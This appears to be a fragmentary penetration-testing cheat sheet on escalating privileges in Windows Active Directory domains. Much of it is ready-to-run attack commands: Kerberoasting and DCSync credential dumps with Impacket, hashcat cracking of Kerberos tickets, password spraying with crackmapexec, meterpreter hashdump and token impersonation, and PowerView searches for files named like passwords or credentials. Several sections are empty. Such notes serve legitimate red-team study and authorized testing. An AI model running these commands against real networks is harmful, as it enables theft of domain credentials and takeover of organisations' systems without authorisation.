# Active Directory PrivEsc

## Introduction

## Tools

#### SMB enumeration tools

See [SMB tool](SMB/smbCS)

#### Bloodhound and Sharphound

[Sharphound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) is the collector that gathers all the information abnout the 
network and compresses it into a zip file. You can then import this data and view a map of the AD domain. This very import to see weak points
like DCsyncs, Usernames, Trust 


#### Crackmapexec


#### Empire and Starkiller


Rubeus, Seatbelt, Mimikatz...

#### Hashcat/JtR
`hashcat -m 13100 -a 0 hash.txt rockyou.txt`

#### Impacket

Kerberoasting 
```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip $IP $DOMAIN.local/$USER:$PASSWORD -request
```
Exploit DCSync Privileges
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -dc-ip $IP $DOMAIN/$USER@$IP
```

#### Kerbrute

You want to target the subnet and then as you laterally move through the network the Adminstrators and DCs.
`crackmapexec smb $IP -u users.txt -p passes.txt`

#### Metasploit and Proxychains

Metasploit combined with proxychains can used to pivot and access segmented sections of network.
The shells create route through then inaccessable parts of the network can be mapped beyond the shell's address.
To proxy through the network see sections on [proxychains in proxies]() and [metasploit autoroute and socks5 server](). 

Due to Trusts, pivoting in required to hop to the connection between Domains. 
Trust can be: 
1. Directional - The direction of the trusts flows from a trusting domain to a trusted domain.
1. Transitive - The trust relationship expands beyond just two domains to include other trusted domains.

If inclined meterpreter and its commands:
```meterpreter

migrate 	# Don't forget to migrate to better processes as processes die: lsass.exe
hashdump

use incognito
list_token -u
impersonate_token $ TOKEN

```

#### Powerview
PowerView "is a powershell tool to gain network situational awareness one Windows domains."
[Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

Due to AD commands are a restricted to DCs and some(times) Adminstrators. 
Get PowerView on the box, you need some help.
```
. .\PowerView.ps1				# import PowerView
Import Module PowerView.ps1			
Get-NetDomain					# Like ADDomain but lists less information
Get-NetDomainController				# List all Domain Controller
Get-NetForest					# like AdForest
Get-NetDomainTrust				# like NetDomainTrust

Find-InterestingDomainShareFile
-CheckAccess
*password*
*sensitive*
*admin*
*login*
*secret*
*unattend*.xml
*vmdk
*creds*
*credential*
*.config
```


## General Enumeration

```powershell
ipconfig /displaydns	# Get DC ip
Get-ADForest | Select-Object Domains								# Lists all Domains in Forest
Get-ADTrust -Filter * | Select-Object Direction,Source,Target					# List trust information
dsquery group -name "Domain Admins" | dsget group -expand -members				# Query for all DCs
Get-ADDomain | Select-Object NetBIOSName, DNSRoot, InfrastructureMaster				# List all DCs
Get-ADUser -Filter * -Properties Description | Where-Object { $_.Description.length -gt 8 } 	# Searching AD replace *!
```




